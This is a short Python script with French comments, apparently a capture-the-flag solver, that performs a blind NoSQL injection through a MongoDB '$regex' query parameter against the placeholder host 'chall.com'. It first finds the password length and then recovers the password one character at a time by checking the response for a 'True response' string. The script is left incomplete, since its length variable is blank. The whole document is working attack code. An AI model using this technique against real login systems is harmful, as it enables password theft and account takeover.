'''Trouver la lngueur du mot de passe:'''
#http://chall.com?param=[$regex]=.{i} -> faire varier i

import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@-+/()!\"$%=^[]:;"

taille=#taille du mot de passe à remplir
flag = ""
for i in range(taille, -1, -1):
    print("[i] Looking for char number "+str(taille-i))
    for char in alphabet:
        r = requests.get("http://chall.com?param=[$regex]="+flag+char+".{"+str(i)+"}")
        if ("True response" in r.text): #a modifier
            flag += char
            print("[+] Flag: "+flag)
            break
